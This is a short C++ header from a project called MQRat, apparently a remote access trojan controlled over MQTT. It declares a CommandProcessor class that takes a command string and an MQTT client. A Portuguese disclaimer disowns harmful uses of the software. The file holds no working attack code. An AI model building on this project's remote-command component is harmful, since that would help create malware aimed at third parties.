/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#ifndef COMMAND_PROCESSOR_H
#define COMMAND_PROCESSOR_H

#include <string>
#include "mqtt_client.hpp"

using namespace std;

class CommandProcessor {
	public:
		explicit CommandProcessor(string cmd, MqttClient *client);

		void Process();
		
	private:
		string command;
		MqttClient *client;
};

#endif
